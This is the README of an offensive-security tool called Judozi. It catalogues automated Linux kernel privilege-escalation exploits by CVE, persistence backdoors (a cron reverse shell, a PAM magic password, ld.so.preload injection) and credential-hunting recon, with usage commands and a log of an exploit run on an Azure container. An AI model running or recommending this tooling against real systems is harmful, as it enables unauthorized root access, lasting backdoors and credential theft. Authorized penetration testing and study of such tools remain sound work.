<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,11,20&height=200&section=header&text=JUDOZI&fontSize=70&fontAlignY=35&animation=twinkling&fontColor=fff&desc=Modular%20Offensive%20Security%20Framework&descAlignY=55&descSize=18" />

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.22+-00ADD8?style=for-the-badge&logo=go&logoColor=white&labelColor=1a1a1a" />
  <img src="https://img.shields.io/badge/Platform-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black&labelColor=1a1a1a" />
  <img src="https://img.shields.io/badge/Architecture-Modular-FF6B6B?style=for-the-badge&labelColor=1a1a1a" />
  <img src="https://img.shields.io/badge/License-Educational-E74C3C?style=for-the-badge&labelColor=1a1a1a" />
</p>

<p align="center">
  <img src="https://img.shields.io/badge/🔥%20Zero%20Dependencies-5.3MB%20Binary-FF6B6B?style=flat-square&labelColor=1a1a1a" />
  <img src="https://img.shields.io/badge/⚡%20Hybrid%20Mode-Compile%20%7C%20Binary-4ECDC4?style=flat-square&labelColor=1a1a1a" />
  <img src="https://img.shields.io/badge/🎯%20Smart%20Detection-Auto%20Match-95E1D3?style=flat-square&labelColor=1a1a1a" />
  <img src="https://img.shields.io/badge/🛡️%20Kernel%20Range-2.6.22%20→%206.7.1-F38181?style=flat-square&labelColor=1a1a1a" />
</p>

<h3 align="center">
  <a href="#-features">Features</a>
  <span> • </span>
  <a href="#-quick-start">Installation</a>
  <span> • </span>
  <a href="#-usage">Usage</a>
  <span> • </span>
  <a href="#-exploit-database">Exploits</a>
  <span> • </span>
  <a href="#-how-it-works">How It Works</a>
</h3>

<br/>

<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=6,11,20&height=2" />

</div>

## FEATURES

<div align="center">

<table>
<tr>
<td width="50%" align="center">

### CORE FRAMEWORK

```diff
+ Modular Plugin System
  Drop-in module support

+ Module Registry
  Auto-discovery and loading

+ Interactive UI
  Clean module selection menu

+ Command-line Interface
  Direct module execution

+ Extensible Architecture
  Easy to add new modules

+ Zero Dependencies
  Pure Go, static binary
```

</td>
<td width="50%" align="center">

### KERNEL MODULE

```diff
! Dynamic Exploit Library
  Kernel 2.6.22 → 6.7.1 coverage

! Smart Detection
  Auto-detects vulnerabilities

! Hybrid Execution
  Compile OR precompiled

! GCC-Free Mode
  Works without compiler

! Binary Fallback
  Download when needed

! Automatic Mode
  Try all exploits
```

</td>
</tr>
</table>

</div>

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=12,20,6&height=2" />

</div>

## QUICK START

### One-Line Installation

```bash
wget https://github.com/past3l/judozi/raw/main/judozi && chmod +x judozi && ./judozi
```

### Alternative: Build from Source

```bash
git clone https://github.com/past3l/judozi.git
cd judozi
CGO_ENABLED=0 go build -ldflags="-s -w" -o judozi ./cmd/judozi
./judozi
```

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=20,6,12&height=2" />

</div>

## USAGE

### Interactive Mode (Recommended)

Run Judozi and select a module interactively:

```bash
./judozi
```

<details>
<summary>📸 Click to see module selection</summary>

```
     ▄▄▄██▀▀▀█    ██  ▓█████▄  ▒█████   ▒███████▒ ██▓
       ▒██   ██  ▓██▒ ▒██▀ ██▌▒██▒  ██▒▒ ▒ ▒ ▄▀░▓██▒
       ░██  ▓██  ▒██░ ░██   █▌▒██░  ██▒░ ▒ ▄▀▒░ ▒██▒
    ▓██▄██▓ ▓▓█  ░██░ ░▓█▄   ▌▒██   ██░  ▄▀▒   ░░██░
     ▓███▒  ▒▒█████▓  ░▒████▓ ░ ████▓▒░▒███████▒░██░

  ┌────────────────────────────────────────────────┐
  │  Modular Offensive Security Framework v2.0    │
  │  Author: past3l@mileniumsec                   │
  │  GitHub: github.com/past3l/judozi             │
  └────────────────────────────────────────────────┘

SELECT MODULE:

  [1] kernel
      privesc - Automated Linux Kernel Privilege Escalation

  ╔════════════════════════════════════════╗
  ║ Enter number (1-N) or 'q' to quit    ║
  ╚════════════════════════════════════════╝
  > 
```

</details>

### Direct Module Execution

Run a specific module directly:

```bash
# Run kernel module interactively
./judozi kernel

# List all kernel exploits
./judozi kernel -list

# Automatic mode (try all matching exploits)
./judozi kernel -auto

# Target specific CVE
./judozi kernel -cve CVE-2022-0847

# Use custom exploit mirror
./judozi kernel -mirror https://example.com/exploits
```

### Command Line Options

```bash
# List all available modules
./judozi -l
./judozi --list

# Show help
./judozi -h
./judozi --help

# Run a module with args
./judozi [module] [module-args]
```

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=6,12,20&height=2" />

</div>

## MODULES

### 🔓 Kernel Module (Privilege Escalation)

Automated Linux kernel privilege escalation framework with 19+ exploits.

**Features:**
- Smart kernel version detection
- Automatic exploit matching  
- Hybrid execution (compile or precompiled)
- GCC-free mode with binary fallback
- Range: Kernel 2.6.22 → 6.7.1

```bash
./judozi kernel          # Interactive mode
./judozi kernel -list    # List all exploits
./judozi kernel -auto    # Try all matching
./judozi kernel -cve CVE-2022-0847
```

---

### 🔒 Persistence Module

8 proven persistence techniques with stealth rating and reboot survival info.

**Techniques:**
- SSH authorized_keys injection
- Cron reverse shell (every 10 min)
- Systemd service (`system-monitor`)
- Custom SUID binary
- `/etc/ld.so.preload` shared lib injection
- PAM auth bypass (magic password backdoor)
- `.bashrc` / `.profile` injection
- SUID bash copy

```bash
./judozi persistence         # Interactive selection
./judozi persistence -list   # List all techniques
./judozi persistence 3       # Install technique #3
./judozi persistence -remove # Remove installed backdoors
```

---

### 🔍 Recon Module

12 parallel reconnaissance techniques. All output auto-saved to `./recon/` directory.

**Techniques:**
- System info (OS, CPU, memory, kernel, env, installed tools)
- Network enumeration (interfaces, routes, ports, ARP, DNS, firewall rules)
- User & group enumeration (sudoers, shadow, login history, dotfiles)
- SUID/SGID binaries + GTFOBins detection
- Process enumeration (cmdlines, root procs, env secrets)
- Credential hunting (SSH keys, `.env`, config files, AWS/k8s creds)
- Cron & scheduled tasks (crontab, systemd timers, at jobs)
- Service enumeration (systemd, init.d, versions)
- Container & Docker recon (socket, cgroups, namespaces, metadata service)
- Environment secrets (env vars, `/proc` env, process cmdlines)
- SSH & lateral movement (known_hosts, agent sockets, authorized_keys)
- Filesystem (writable dirs/files, sensitive files, backup files, logs)

```bash
./judozi recon               # Run all 12 techniques in parallel → saves to ./recon/
./judozi recon -list         # List techniques
./judozi recon 1 4 7         # Run specific techniques by ID
./judozi recon -dir /tmp     # Save to custom directory
./judozi recon -nosave       # Print to stdout only
```

---

### 🚀 Coming Soon

- **container** - Container escape techniques (Docker socket, cgroup v1, privileged, overlay)

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=12,20,6&height=2" />

</div>

## DYNAMIC EXPLOIT LIBRARY

<div align="center">

<sub>Constantly updated repository of kernel privilege escalation vulnerabilities</sub>

</div>

<table>
<thead>
<tr>
<th><img src="https://img.shields.io/badge/CVE-ID-FF6B6B?style=flat-square" /></th>
<th><img src="https://img.shields.io/badge/Name-Exploit-4ECDC4?style=flat-square" /></th>
<th><img src="https://img.shields.io/badge/Kernel-Range-95E1D3?style=flat-square" /></th>
<th><img src="https://img.shields.io/badge/Arch-Support-F38181?style=flat-square" /></th>
<th><img src="https://img.shields.io/badge/Tags-Category-AA96DA?style=flat-square" /></th>
</tr>
</thead>
<tbody>

<tr><td><code>CVE-2024-1086</code></td><td>nf_tables UAF</td><td>3.15.0 → 6.7.1</td><td>amd64</td><td>nftables, uaf</td></tr>
<tr><td><code>CVE-2023-3269</code></td><td>StackRot</td><td>6.1.0 → 6.4.0</td><td>amd64</td><td>maple-tree, uaf</td></tr>
<tr><td><code>CVE-2023-32233</code></td><td>Netfilter nf_tables UAF</td><td>3.13.0 → 6.3.1</td><td>amd64</td><td>nftables, uaf</td></tr>
<tr><td><code>CVE-2023-2640</code></td><td>GameOver(lay)</td><td>5.15.0 → 6.2.0</td><td>amd64, arm64</td><td>overlayfs, ubuntu</td></tr>
<tr><td><code>CVE-2022-34918</code></td><td>Netfilter Heap Overflow</td><td>5.8.0 → 5.18.8</td><td>amd64</td><td>nftables, heap</td></tr>
<tr><td><code>CVE-2022-2588</code></td><td>DirtyCred</td><td>3.6.0 → 5.19.1</td><td>amd64</td><td>route4, uaf</td></tr>
<tr><td><code>CVE-2022-1015</code></td><td>nf_tables OOB</td><td>5.12.0 → 5.17.0</td><td>amd64</td><td>nftables, oob</td></tr>
<tr><td><code>CVE-2022-0847</code></td><td><strong>DirtyPipe</strong></td><td>5.8.0 → 5.16.10</td><td>amd64, arm64</td><td>pipe, write-anywhere</td></tr>
<tr><td><code>CVE-2022-0185</code></td><td>fsconfig Heap Overflow</td><td>5.1.0 → 5.16.1</td><td>amd64</td><td>fsconfig, heap</td></tr>
<tr><td><code>CVE-2021-33909</code></td><td>Sequoia</td><td>3.16.0 → 5.13.3</td><td>amd64</td><td>filesystem, seq_file</td></tr>
<tr><td><code>CVE-2021-22555</code></td><td>Netfilter xt_compat</td><td>2.6.19 → 5.12.0</td><td>amd64</td><td>netfilter, oob-write</td></tr>
<tr><td><code>CVE-2021-3493</code></td><td>OverlayFS Ubuntu</td><td>3.13.0 → 5.10.99</td><td>amd64, arm64</td><td>overlayfs, ubuntu</td></tr>
<tr><td><code>CVE-2020-8835</code></td><td>eBPF Verifier Bypass</td><td>5.5.0 → 5.6.1</td><td>amd64</td><td>ebpf, verifier</td></tr>
<tr><td><code>CVE-2019-13272</code></td><td>ptrace_link</td><td>4.10.0 → 5.1.17</td><td>amd64, arm64</td><td>ptrace, creds</td></tr>
<tr><td><code>CVE-2017-16995</code></td><td>eBPF Arbitrary R/W</td><td>4.4.0 → 4.14.7</td><td>amd64</td><td>ebpf, sign-extension</td></tr>
<tr><td><code>CVE-2017-7308</code></td><td>AF_PACKET</td><td>2.6.27 → 4.10.5</td><td>amd64</td><td>af_packet, heap-oob</td></tr>
<tr><td><code>CVE-2017-1000112</code></td><td>UDP UFO</td><td>4.4.0 → 4.12.6</td><td>amd64</td><td>udp, ufo</td></tr>
<tr><td><code>CVE-2016-5195</code></td><td><strong>DirtyCow</strong></td><td>2.6.22 → 4.8.2</td><td>amd64, arm64</td><td>cow, race-condition</td></tr>
<tr><td><code>CVE-2016-0728</code></td><td>Keyring Refcount</td><td>3.8.0 → 4.4.0</td><td>amd64</td><td>keyring, refcount</td></tr>

<tr><td colspan="5" align="center">
<br/>
<img src="https://img.shields.io/badge/➕%20More%20Exploits%20Available-Use%20--list%20flag-00D9FF?style=for-the-badge&labelColor=1a1a1a" />
<br/><br/>
</td></tr>
</tbody>
</table>

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=12,6,20&height=2" />

</div>

## HOW IT WORKS

```
╔════════════════════════════════════════════╗
║       JUDOZI FRAMEWORK PIPELINE           ║
╠════════════════════════════════════════════╣
║                                            ║
║  [1] INIT                                  ║
║      ├─ Load module registry               ║
║      ├─ Auto-discover modules              ║
║      └─ Initialize UI                      ║
║                                            ║
║  [2] MODULE SELECTION                      ║
║      ├─ Interactive menu                   ║
║      ├─ Direct CLI execution               ║
║      └─ Validate availability              ║
║                                            ║
║  [3] EXECUTION                             ║
║      ├─ Load selected module               ║
║      ├─ Pass arguments                     ║
║      └─ Execute module.Run()               ║
║                                            ║
╚════════════════════════════════════════════╝
```

### Architecture

**Module Interface:**
```go
type Module interface {
    Name() string
    Description() string
    Category() string
    Run(args []string) error
}
```

<div align="center">

<img src="https://img.shields.io/badge/✓%20Statically%20Linked-No%20Dependencies-4ECDC4?style=flat-square&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/✓%20Stripped-Smaller%20Binary-95E1D3?style=flat-square&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/✓%20Open%20Source-Public%20Code-F38181?style=flat-square&labelColor=1a1a1a" />

</div>

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=20,12,6&height=2" />

</div>

## PROJECT STRUCTURE

```
judozi/
├── cmd/judozi/main.go       # Entry point, module registry
├── modules/
│   ├── kernel/              # Kernel privesc (19 CVEs)
│   ├── persistence/         # 8 persistence techniques
│   └── recon/               # 12 recon techniques
│       └── techniques/
├── pkg/
│   ├── module/              # Module interface + registry
│   ├── shell/               # Interactive shell
│   └── ui/                  # Terminal UI helpers
├── binaries/                # Precompiled exploit binaries
├── go.mod
└── README.md
```

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=6,20,12&height=2" />

</div>

## REAL-WORLD TESTING

<div align="center">

<table>
<tr>
<td align="center">

**Successfully tested on Azure Container (Production Environment)**

<img src="https://img.shields.io/badge/Environment-Azure%20Container-0078D4?style=for-the-badge&logo=microsoftazure&logoColor=white&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/Kernel-5.15.0--1102--azure-FCC624?style=for-the-badge&logo=linux&logoColor=black&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/Status-Success-00D9FF?style=for-the-badge&labelColor=1a1a1a" />

</td>
</tr>
</table>

</div>

```bash
nextjs@container:/tmp$ uname -r
5.15.0-1102-azure

nextjs@container:/tmp$ ./judozi
[*] Kernel: 5.15.0
[+] Found 10 potential exploit(s)
  > all

[!] GCC not available, downloading precompiled binary
[*] Downloading CVE-2024-1086...
[+] Binary downloaded successfully
[*] Executing exploit...
[*] creating user namespace (CLONE_NEWUSER)...
[*] creating network namespace (CLONE_NEWNET)...
```

<div align="center">

<img src="https://img.shields.io/badge/✓%20Binary%20Fallback-Works%20Flawlessly-4ECDC4?style=flat-square&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/✓%20Zero%20Dependencies-Confirmed-95E1D3?style=flat-square&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/✓%20Auto%20Detection-Successful-F38181?style=flat-square&labelColor=1a1a1a" />

</div>  

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=12,20,6&height=2" />

</div>

## SECURITY & LEGAL NOTICE

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=24&height=100&section=header&text=FOR%20EDUCATIONAL%20USE%20ONLY&fontSize=30&fontColor=fff&animation=fadeIn" />

</div>

This tool is designed **exclusively** for:

<div align="center">

<img src="https://img.shields.io/badge/Security%20Research-Education-4ECDC4?style=for-the-badge&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/Authorized-Penetration%20Testing-95E1D3?style=for-the-badge&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/CTF-Competitions-F38181?style=for-the-badge&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/Understanding-Vulnerabilities-AA96DA?style=for-the-badge&labelColor=1a1a1a" />

</div>

**YOU MUST HAVE EXPLICIT PERMISSION** to use this tool on any system.

#### Legal Responsibilities

<div align="center">

<table>
<tr>
<td width="50%" align="center">

**ALLOWED**

```diff
+ Testing your own systems
+ Authorized pentesting
+ Educational research
+ CTF competitions
```

</td>
<td width="50%" align="center">

**ILLEGAL**

```diff
- Unauthorized access
- Systems you don't own
- Malicious intent
- Illegal privilege escalation
```

</td>
</tr>
</table>

</div>

<div align="center">

<img src="https://img.shields.io/badge/⚠️%20WARNING-Author%20Not%20Responsible%20for%20Misuse-E74C3C?style=for-the-badge&labelColor=1a1a1a" />

</div>

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=20,6,12&height=2" />

</div>

## BUILDING FROM SOURCE

### Prerequisites

- Go 1.22 or higher
- No other dependencies required (CGO disabled)

### Build Commands

```bash
# Standard build (static binary)
CGO_ENABLED=0 go build -ldflags="-s -w" -o judozi .

# Cross-compile for ARM64
GOARCH=arm64 CGO_ENABLED=0 go build -ldflags="-s -w" -o judozi-arm64 .

# Cross-compile for 32-bit/cmd/judozi

# Cross-compile for ARM64
GOARCH=arm64 CGO_ENABLED=0 go build -ldflags="-s -w" -o judozi-arm64 ./cmd/judozi

# Cross-compile for 32-bit
GOARCH=386 CGO_ENABLED=0 go build -ldflags="-s -w" -o judozi-i386 ./cmd/judozi

# Debug build (with symbols)
CGO_ENABLED=0 go build -o judozi-debug ./cmd/judozi
```

### Build flags explained:
- `CGO_ENABLED=0` → Produce pure static binary
- `-ldflags="-s -w"` → Strip debug symbols (smaller size)
- `-o judozi` → Output filename
- `./cmd/judozi` → Entry point path
</div>

## CONTRIBUTING

<div align="center">

<img src="https://img.shields.io/badge/Contributions-Welcome-00D9FF?style=for-the-badge&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/Pull%20Requests-Open-4ECDC4?style=for-the-badge&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/Issues-Report%20Bugs-F38181?style=for-the-badge&labelColor=1a1a1a" />

</div>

Contributions are welcome! Here's how you can help:
Modules

Create a new module by implementing the `Module` interface:

```go
package mymodule

import "github.com/judozi/judozi/pkg/module"

type MyModule struct{}

func New() module.Module {
    return &MyModule{}
}

func (m *MyModule) Name() string {
    return "mymodule"
}

func (m *MyModule) Description() string {
    return "My awesome module"
}

func (m *MyModule) Category() string {
    return "exploitation"
}

func (m *MyModule) Run(args []string) error {
    // Your module logic here
    return nil
}
```

Then register it in `cmd/judozi/main.go`:
```go
registry.Register(mymodule.New())
```

### Adding Kernel 
### Adding New Exploits

### Adding Kernel Exploits

1. Add exploit metadata to `modules/kernel/pkg/vulndb/exploits.json`:
```json
{
  "id": "CVE-XXXX-XXXXX",
  "name": "Exploit Name",
  "description": "Technical description",
  "min_kernel": "X.X.X",
  "max_kernel": "X.X.X",
  "arch": ["amd64"],
  "source": "https://github.com/.../exploit.c",
  "binary": "https://raw.githubusercontent.com/past3l/judozi/main/binaries/CVE-XXXX-XXXXX",
  "compile": "gcc -o {bin} {src} -static",
  "execute": "{bin}",
  "requirements": ["gcc"],
  "tags": ["tag1", "tag2"],
  "references": ["https://nvd.nist.gov/..."]
}
```

2. Compile static binary and add to `modules/kernel/binaries/`
3. Test on target kernel version
4. Submit pull request

### Reporting Issues

<div align="center">

<table>
<tr>
<td align="center" width="33%">

**Bug Reports**

[GitHub Issues](https://github.com/past3l/judozi/issues)

<img src="https://img.shields.io/badge/Bugs-Report-FF6B6B?style=flat-square&labelColor=1a1a1a" />

</td>
<td align="center" width="33%">

**Feature Requests**

[GitHub Discussions](https://github.com/past3l/judozi/discussions)

<img src="https://img.shields.io/badge/Ideas-Discuss-4ECDC4?style=flat-square&labelColor=1a1a1a" />

</td>
<td align="center" width="33%">

**Security Issues**

Contact privately

<img src="https://img.shields.io/badge/Security-Private-95E1D3?style=flat-square&labelColor=1a1a1a" />

</td>
</tr>
</table>

</div>

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=12,20,6&height=2" />

</div>

## LICENSE

<div align="center">

<img src="https://img.shields.io/badge/License-Educational%20Use%20Only-E74C3C?style=for-the-badge&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/Sources-Public%20Repositories-00D9FF?style=for-the-badge&labelColor=1a1a1a" />

</div>

**Educational Use Only**

This project is provided for educational and research purposes. Exploit code belongs to the original authors and researchers. See individual exploit references for specific licensing.

<div align="center">

<table>
<tr>
<td align="center">

**Exploit Sources**

</td>
</tr>
<tr>
<td>

- https://github.com/ (various researchers)
- https://www.exploit-db.com/
- Google Project Zero
- Security research publications

</td>
</tr>
</table>

</div>

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=rect&color=gradient&customColorList=20,6,12&height=2" />

</div>

## AUTHOR

**past3l** @ [mileniumsec](https://github.com/past3l)

- GitHub: [@past3l](https://github.com/past3l)
- Repository: [judozi](https://github.com/past3l/judozi)
- Twitter: (if applicable)

## 🙏 Credits & Acknowledgments

<div align="center">

<img src="https://img.shields.io/badge/Thanks%20To-Security%20Researchers-FF6B6B?style=for-the-badge&labelColor=1a1a1a" />
<img src="https://img.shields.io/badge/Powered%20By-Open%20Source-4ECDC4?style=for-the-badge&labelColor=1a1a1a" />

</div>

Special thanks to:

<table>
<tr>
<td width="50%">

**Research Organizations**

- **Google Project Zero** → Advanced kernel security research
- **Qualys Security** → Sequoia and other critical discoveries
- **Linux Kernel Community** → Rapid patching and improvements
- **Exploit-DB** → Public exploit database
- **The Go Team** → Static binary compilation support

</td>
<td width="50%">

**Notable Researchers**

- **@Notselwyn** - CVE-2024-1086 (nf_tables UAF)
- **@firefart** - CVE-2016-5195 (DirtyCow)
- **Max Kellermann** - CVE-2022-0847 (DirtyPipe)
- **@lrh2000** - CVE-2023-3269 (StackRot)
- And many others in the security community

</td>
</tr>
</table>

<br/>

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,11,20&height=150&section=footer" />

<table>
<tr>
<td align="center">

<h3>With great power comes great responsibility</h3>

<sub>Use this tool ethically and legally. Always obtain proper authorization.</sub>

<br/><br/>

<img src="https://img.shields.io/github/stars/past3l/judozi?style=social" />
<img src="https://img.shields.io/github/forks/past3l/judozi?style=social" />
<img src="https://img.shields.io/github/watchers/past3l/judozi?style=social" />

<br/><br/>

**Made by past3l** | [Star this repo](https://github.com/past3l/judozi) if you find it useful

</td>
</tr>
</table>

</div>
